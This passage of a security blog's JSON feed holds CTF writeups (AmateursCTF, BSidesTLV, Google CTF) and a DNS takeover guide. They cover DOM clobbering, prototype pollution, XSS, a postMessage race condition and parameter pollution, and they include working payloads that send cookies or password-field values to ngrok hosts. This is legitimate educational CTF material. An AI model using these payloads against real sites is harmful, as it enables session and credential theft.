http.server.HTTPServer(('', 8000), handle_request)</div><div class='line'>server.serve_forever()</div><div class='line'></div></code></div></pre><!-- HTML_TAG_END --><p>Run the code and proxy it through ngrok:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 server.py</div><div class='line'>ngrok http 8000</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"prototype-pollution\"><a href=\"#prototype-pollution\">Prototype Pollution</a></h3><p>With having control of the <code>extension</code> variable, lets try to do parameter pollution at this point. The most basic payload that came to my mind: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>&#123;</div><div class='line'>  \"__proto__\": &#123;</div><div class='line'>    \"sanitize\": false,</div><div class='line'>    \"report\": true</div><div class='line'>  &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>But as assumed very earlier, this gave me error as i can‚Äôt override the private member of Debug class. Well, the default value should be undefined when none provided for <code>get</code> function. Because, you see the simple sanitize resolves to the <code>get</code> function of the <code>Debug</code>. Since, we are overriding the prototype, we should leave it like this: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>&#123;</div><div class='line'>  \"__proto__\": &#123;</div><div class='line'>    \"report\": true</div><div class='line'>  &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/8128f783-7c66-479d-8b10-39989c5346a2\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>And we got to this point as well. </p><h4 id=\"proof-of-concept-poc\"><a href=\"#proof-of-concept-poc\">Proof of Concept (POC)</a></h4><p>Lets craft our final PoC. In the <code>name your rant</code> field we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;a id=\"debug\"&gt;&lt;/a&gt;&lt;a id=\"debug\" name=\"extension\" href=\"http://payload.shameerkashif.me\"&gt;&lt;/a&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>And for our server, we would give the following payload:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import json</div><div class='line'></div><div class='line'>def handle_request(request):</div><div class='line'>    response = &#123;</div><div class='line'>      \"__proto__\": &#123;</div><div class='line'>        \"report\": true</div><div class='line'>      &#125;</div><div class='line'>    &#125;</div><div class='line'>    response_headers = &#123;\"Access-Control-Allow-Origin\": \"*\"&#125;</div><div class='line'>    return http.server.SimpleHTTPRequestHandler._set_headers(</div><div class='line'>        request, response, response_headers</div><div class='line'>    )</div><div class='line'></div><div class='line'>server = http.server.HTTPServer(('', 8000), handle_request)</div><div class='line'>server.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><p>And finally in the paste section, lets put our final payload to steal the cookie: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;script&gt;fetch(\"http://ngrokurl/\" + document.cookie)&lt;/script&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>And we get the flag in the server url. As said i wasn‚Äôt able to solve the challenge within due time as i got stuck with anchor tag issue. But neverthless, this was a fun challenge and was worth exploring. </p>","summary":"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.","image":"https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3","date_published":"2023-07-21T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.278Z","tags":["amateurs-ctf","writeup","sanity","xss","dom-clobbering","prototype-pollution"],"_indieweb":{"type":"article"}},{"id":"blog/2023/subrake-a-dns-automated-scanner","url":"https://blog.shameerkashif.me/blog/2023/subrake-a-dns-automated-scanner","title":"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>DNS have been there for years now to help you find things normally you wouldn‚Äôt remember. In this guide, we will go through the following set of problems that a third party can find and take advantage of in negative terms:</p><ul><li>DNS Zone Transfer</li><li>Subdomain Takeover</li><li>DNS Zone Transfer</li></ul><h2 id=\"subrake\"><a href=\"#subrake\">Subrake</a></h2><p>The primary reason i wrote this blog post was this project i am working on: <a href=\"https://github.com/hash3liZer/Subrake\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Subrake</a>. It‚Äôs an automated DNS scanner to cover various issues in a single go. Let me know what you think about it in the comment section‚Ä¶</p><h2 id=\"explanation\"><a href=\"#explanation\">Explanation</a></h2><h3 id=\"zone-transfer\"><a href=\"#zone-transfer\">Zone Transfer</a></h3><p>Zone Transfer itself is not a vulnerability and is a procedure followed to transfer the records of a domain from one DNS server to another. For example, you need to replicate the records of your domain available in <code>namecheap</code> to AWS <code>Route53</code>.</p><p>In a Zone transfer, the dns server sends a complete dns records file to another server. The file contains everything the DNS server has regarding that domain including its <code>A</code>, <code>AAAA</code>, <code>CNAME</code>, and <code>SOA</code> records. This includes the information which publicly isn‚Äôt accessible. </p><p>For example, you can‚Äôt access the <code>CNAME</code> records of any domain without having to brute force your way into it. But if the DNS server itself is offering the service, kaboom. </p><p>Most of the pople in industry are already aware of Zone transfer, so lets directly jump to the part <strong>How to find it?</strong>. There are many tools available in the wild to find <code>zone transfer</code>. But the famous and the most simple one is <code>dig</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dig zonetransfer.me -t AXFR +nocookie @dns_address</div></code></div></pre><!-- HTML_TAG_END --><ul><li>The <code>-t AXFR</code> option is a type of query to request zone transfer details.</li><li>The <code>+nocookie</code> option would disable the use of DNS cookies.</li><li>And additionally, you can specify <code>@dns_server</code> which can be skipped to use default DNS servers. I would highly recommend this option if you a playing a CTF or inside a network where a private DNS server is accessible.</li></ul><p>If successfull, this would list all the DNS records. This can also be accomplished using <code>subrake -d zonetransfer.me</code> and you would get: </p><img width=\"828\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/e0552efd-45d1-41fc-ad00-63706be3849a\"><h3 id=\"subdomain-takeover\"><a href=\"#subdomain-takeover\">Subdomain Takeover</a></h3><p>Subdomain Takeover unlike it sounds is actually the takeover of the service that subdomain is pointing to. Lets say <code>marketing.domain.tld</code> was pointing to an Amazon <code>S3</code> bucket or <code>ELastic Beanstalk</code> service which actually didn‚Äôt exist. </p><p>A third party can come and claim this service. Now what happens is that the party that claimed the service can host whatever they want on that subdomain but that ofcourse is limited to what the service has to offer. </p><p>Most of the people in industry have been creating their automations of this. Some use their own tools and some have sort of created a workflow. </p><p>You can go for a <code>oneliner</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass enum -norecursive -noalts -d HOST &gt;&gt; FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 &gt;&gt; takeover ; </div></code></div></pre><!-- HTML_TAG_END --><p>Or you can find the subdomains first using different tools and public sources and probably use a tool to check the takeover. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>python3 sublist3r.py -d target.com</div><div class='line'>amass enum -d target.com</div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>Checking the takeover: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>subrake -d target.com -w ./finalwordlists.txt</div></code></div></pre><!-- HTML_TAG_END --><img width=\"828\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ce1559b0-e5fe-4fdc-ae2c-98de252c9970\"><p>The list of services that are currently known to vulnerable to Subdomain Takeover can be found at: <strong><a href=\"https://github.com/EdOverflow/can-i-take-over-xyz\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Can I Takeover XYZ</a></strong></p><h3 id=\"dns-zone-takeover\"><a href=\"#dns-zone-takeover\">DNS Zone Takeover</a></h3><p>Zone Takeover is a term not too old right now and its actually is as it sounds unlike subdomain takeover. And it can be more <strong>severe</strong> as you have the control over the complete zone. In order words, you can host your own <code>records</code> and are not limited to the service being used like subdomain takeover. </p><p>The normal procedure that is being followed or atleast i follow this:</p><ul><li>I purchase the domain from namecheap or godaddy.</li><li>I create a new <code>Hosted Zone</code> in AWS <code>Route53</code> service.</li><li>The hosted zone gives me a set of nameservers.</li><li>I enter these nameservers into the Authoritative nameservers section in GoDaddy or namecheap.</li><li>Then i use the <code>Route53</code> service instead of GoDaddy or Namecheap to manage the records like <code>A</code>, <code>AAAA</code>, or <code>CNAME</code>. </li></ul><p>Infact, if you ever worked with <strong>Cloudflare</strong>, you would know that you create a new website in Cloudflare. In result you get the nameservers. You then set the <code>nameservers</code> with the domain you purchased. </p><p>After doing so, you <em>add/edit/remove</em> the records within the cloudflare panel. Lets suppose, after a year you plan to not use the Cloudflare service anymore. So, you delete your website from cloudflare but doesn‚Äôt actually remove the authoritative entries in your domain settings from godaddy. </p><p>Since the nameserver entries already exist and still pointing to the service (aka cloudflare in this case), a third party can claim the service which would lead to <strong>zone takeover</strong>. </p><p>If you understand the above scenario, you can relate it to the subdomain takeover where you claim the stale service. But here, its the stale zone. </p><h4 id=\"finding-zone-takeover\"><a href=\"#finding-zone-takeover\">Finding Zone Takeover</a></h4><p>The good thing with zone takeover is you don‚Äôt have to brute force your way into it or find anything publicly. The information is already there, you just have to make sure its in the right condition. </p><p>The first step would be to get the nameservers of the domain. We can use <code>dig</code> for that: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dig shameerkashif.me +trace +all</div></code></div></pre><!-- HTML_TAG_END --><p>Or you can directly get the <code>NS</code> records and start looking from there. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me NS</div></code></div></pre><!-- HTML_TAG_END --><img width=\"894\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aba8e709-0b33-486a-ac5c-c0ab48264625\"><p>The against each NS record, check if any of them fails to responsd. If it does, it can probably be vulnerable to zone takeover. The case it failes, you will have the status as <strong>REFUSED</strong> or <strong>SERVFAIL</strong>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me @ns1.digitalocean.com</div></code></div></pre><!-- HTML_TAG_END --><p>You can also check for <code>SOA</code> which is what i would like to do instead (to be more concise): </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me @ns1.digitalocean.com SOA</div></code></div></pre><!-- HTML_TAG_END --><p>Well, if it doesn‚Äôt responsd, you can try to claim the service. As of now, the current vulnerable services are available at: <a href=\"https://github.com/indianajson/can-i-take-over-dns\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Can I Takeover DNS</a></p><p>Well, with subrake, it first tries to resolve each nameserver and if it does then it tries to guess the service and tells if its vulnerable or not. Something like this: </p><img width=\"743\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/3d55e662-c019-4062-8c46-4c9075c47a8e\"><h2 id=\"using-subrake\"><a href=\"#using-subrake\">Using Subrake</a></h2><p>Subrake can help you pick all 3 above cases. The complete information and details can be found at the link i mentioned in the start of this blog. I am simply attaching a screenshot with the details. </p><img src=\"https://user-images.githubusercontent.com/29171692/250178751-75abd71e-7765-4da0-8b08-1cc5e1e069c7.png\"><h2 id=\"conclusion\"><a href=\"#conclusion\">Conclusion</a></h2><p>First of all, i hope this guide was helpful üòÖ. We saw 3 different cases namely, Zone Transfer, Zone Takeover and Subdomain Takeover. The mitigation simply is to be aware of when you remove a service. Make sure the entries in your DNS gets updated as well. Or wrap the service completely.</p>","summary":"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.","image":"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127","date_published":"2023-06-30T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.282Z","tags":["dns-zone-takeover","dns-zone-transfer","subdomain-takeover","bugbounty","infosec","reconnaissance","automated-tool"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","url":"https://blog.shameerkashif.me/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","title":"BSidesTLV CTF 2023 Browselicious (Misc) Writeup","content_html":"<h1 id=\"introducton\"><a href=\"#introducton\">Introducton</a></h1><p>This writeup is for the <strong>Browselicious</strong> challenge from <strong>Misc</strong> category in BSidesTLV CTF held online. The challenge had an external link and a <code>js</code> file that contained browser extension code. The external link was a simple website that had a URL Input field. The URL was probably being processed in a browser on the backend with the extension installed.</p><p>To complete the challenge, one had to create a document with a <code>input[type=&quot;password&quot;]</code> field and capture the value of this field when populated by the extension itself. But also, we needed to exploit a race condition here by doing a <code>postMessage</code> before the extension itself.</p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h3 id=\"server-request\"><a href=\"#server-request\">Server Request</a></h3><p>Right after i visited the page, it said <em>Our Extension is coming soon</em> and there was an input field that accepted a URL. So, right away i fired up <code>ngrok</code> without actually running anything for the proxy and checked if i received anything back.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ ngrok http 8000</div></code></div></pre><!-- HTML_TAG_END --><p>And i got requests back on terminal.</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ba40787f-c811-46ec-93a5-1a67298d9a28\"><h3 id=\"code-review\"><a href=\"#code-review\">Code Review</a></h3><p>Then i opened the <code>js</code> file and the code has 2 main events: <code>onMessage</code> and <code>onLoad</code>. The first event checks for a couple conditions and populates data in the <code>input[type=&quot;password&quot;]</code> field. The second event simply fires a <code>postMessage</code> to the current window with some data. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>// Listen for messages from the extension</div><div class='line'>window.addEventListener(\"message\", function (event) &#123;</div><div class='line'>    // Check if the message is from the extension</div><div class='line'>    if (event.source === window && event.data.action === \"populatePassword\") &#123;</div><div class='line'>        // Find the password input field</div><div class='line'>        var passwordField = document.querySelector('input[type=\"password\"]');</div><div class='line'></div><div class='line'>        // Populate the password field with the specified string</div><div class='line'>        if (passwordField) &#123;</div><div class='line'>            passwordField.value = (event.data.url === \"http://flag\") ? \"BSidevTLV2023&#123;TheFlag&#125;\" : \"MyDefaultPassword\";</div><div class='line'>        &#125;</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div><div class='line'></div><div class='line'>// Send a message to populate the password field on page load</div><div class='line'>window.addEventListener(\"load\", function () &#123;</div><div class='line'>    window.postMessage(&#123;</div><div class='line'>        action: \"populatePassword\",</div><div class='line'>        url: window.location.href,</div><div class='line'>        password: \"YourPassword\" // Replace with the desired password</div><div class='line'>    &#125;, \"*\");</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h3><p>To exploit the challenge, we need to implement 3 things in the PoC:</p><ul><li>Create a web page with <code>input[type=&quot;password&quot;]</code> form field which will accept the data.</li><li>Exploit the Race condition by setting an interval in <em>milliseconds</em>.</li><li>In the <code>postMessage</code>, set the value of <code>url</code> to <code>http://flag</code>.</li></ul><p>Before we head to the exploit work, setup a <code>python</code> file to act as our server: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r'''</div><div class='line'>PAYLOAD HERE</div><div class='line'>'''</div><div class='line'></div><div class='line'># Request Handler</div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"input-field\"><a href=\"#input-field\">Input Field</a></h4><p>Put together an html code that as input field: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>          window.addEventListener('load', () =&gt; &#123;</div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;);</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>I fired up this python server, proxied through ngrok:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ python3 poc.py</div></code></div></pre><!-- HTML_TAG_END --><p>Got, the following result:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/d267f5fa-f46e-4443-b43e-64f354a443dc\"><h4 id=\"race-condition\"><a href=\"#race-condition\">Race Condition</a></h4><p>To exploit the race condition, i simply replaced the <code>addEventListener</code> with <code>setInterval</code> having <code>20ms</code>. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"post-message\"><a href=\"#post-message\">Post Message</a></h4><p>Now, simply put the <code>postMessage</code> inside the callback function: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  window.postMessage(&#123;</div><div class='line'>      action: \"populatePassword\",</div><div class='line'>      url: \"http://flag\",</div><div class='line'>      password: \"YourPassword\" // Replace with the desired password</div><div class='line'>  &#125;, \"*\");</div><div class='line'></div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><p>This time i fired up the server and got the flag:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aaa3fa1b-1c7b-45d4-9745-4464d6dd1f4f\"><h2 id=\"poc\"><a href=\"#poc\">PoC</a></h2><p>The complete Proof of Concept:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r\"\"\"</div><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>    &lt;script&gt;</div><div class='line'>            setInterval(() =&gt; &#123;</div><div class='line'>                window.postMessage(&#123;</div><div class='line'>                    action: \"populatePassword\",</div><div class='line'>                    url: \"http://flag\",</div><div class='line'>                    password: \"YourPassword\" // Replace with the desired password</div><div class='line'>                &#125;, \"*\");</div><div class='line'></div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;, 20);</div><div class='line'>    &lt;/script&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div><div class='line'>\"\"\"</div><div class='line'></div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023","image":"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d","date_published":"2023-06-28T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.282Z","tags":["ctf","writeups","bsidestlv-ctf-2023"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-under-construction-google-ctf-2023","url":"https://blog.shameerkashif.me/blog/2023/writeup-under-construction-google-ctf-2023","title":"Google CTF 2023 Under Construction (Web) Writeup","content_html":"<h1 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h1><p>This writeup is for the under construction challenge from web category in Google CTF 2023. The challenge was provided with the following statement: <em>‚ÄúWe were building a web app but the new CEO wants it remade in php.‚Äù</em></p><p>The challenge contained 2 different web apps. One was in PHP that seems to be under development whilst flask app seemed like a full application. This writeup covers an <code>Parameter Pollution</code> vulnerability we were able to create an escalated user by supplying more than 1 parameter. </p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h2 id=\"getting-started\"><a href=\"#getting-started\">Getting Started</a></h2><p>So, at first i visited the URLS and got to know the application surface. Then i downloaded the challenge files available and opened them in the editor. </p><p>Reading the code, i got to the <code>flag</code> point. In the <code>index.php</code> file, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>...</div><div class='line'>if ($tier === NULL) &#123;</div><div class='line'>    return \"Invalid credentials\";</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>$response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";</div><div class='line'></div><div class='line'>// Look at this part. </div><div class='line'>if ($tier === \"gold\") &#123;</div><div class='line'>    $response .= \" \" . getenv(\"FLAG\");</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>return $response;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>So, in order to get the flag, we need to create a gold tier user first. The PHP application itself doesn‚Äôt offer any signup functionlaity but the <code>account_migrator.php</code> file does that is being called from the flask application. So, if we look at the flask application, we will find where the user is being registered. </p><h2 id=\"vulnerable-part\"><a href=\"#vulnerable-part\">Vulnerable Part</a></h2><p>In the <code>authorized_routes.py</code>, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'>@authorized.route('/signup', methods=['POST'])</div><div class='line'>def signup_post():</div><div class='line'>  ...</div><div class='line'>  tier = models.Tier(request.form.get('tier'))</div><div class='line'></div><div class='line'>  if(tier == models.Tier.GOLD):</div><div class='line'>      flash('GOLD tier only allowed for the CEO')</div><div class='line'>      return redirect(url_for('authorized.signup'))  # Validation is based on first parameter</div><div class='line'>  ...</div><div class='line'></div><div class='line'>  new_user = models.User(username=username, </div><div class='line'>  password=generate_password_hash(password, method='sha256'), tier=tier.name)</div><div class='line'>  </div><div class='line'>  db.session.add(new_user)</div><div class='line'>  db.session.commit()</div><div class='line'>  </div><div class='line'>  requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", </div><div class='line'>      headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) # Vulnerable PART</div><div class='line'>  return redirect(url_for('authorized.login'))</div></code></div></pre><!-- HTML_TAG_END --><p>The validation is based on the statement: <code>request.form.get(&#39;tier&#39;)</code>. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the <code>raw_request</code> as it is to the next application which is in PHP. </p><p>Take the following example:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'># Flask</div><div class='line'>curl https://vulnerablepart.com?tier=gold&tier=blue</div><div class='line'># you will the first parameter aka gold.</div><div class='line'></div><div class='line'># PHP</div><div class='line'>curl http://vulnerablepart.com?tier=gold&tier=bold</div><div class='line'># you will get the second parameter aka bold</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h2><p>In order to exploit this, we needed to create the user normally but with extra argument containing <code>gold</code> value. I simply signed up with the following request in Burp: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>POST /signup HTTP/2</div><div class='line'>Host: under-construction-web.2023.ctfcompetition.com</div><div class='line'>Upgrade-Insecure-Requests: 1</div><div class='line'>Origin: https://under-construction-web.2023.ctfcompetition.com</div><div class='line'>Content-Type: application/x-www-form-urlencoded</div><div class='line'>User-Agent: &lt;Redacted&gt;</div><div class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</div><div class='line'></div><div class='line'>username=hash3liZer&password=password&tier=blue&tier=gold</div></code></div></pre><!-- HTML_TAG_END --><p>And it took me back to login page to signin:</p><img width=\"962\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3\"><p>So, i went to the PHP application and logged in and got the flag:</p><img width=\"1440\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f\"><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for under construction challenge from google ctf 2023","image":"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7","date_published":"2023-06-27T00:00:00.000Z","date_modified":"2024-09-14T21:03:45.282Z","tags":["ctf","writeups","google-ctf-2023"],"_indieweb":{"type":"article"}}]}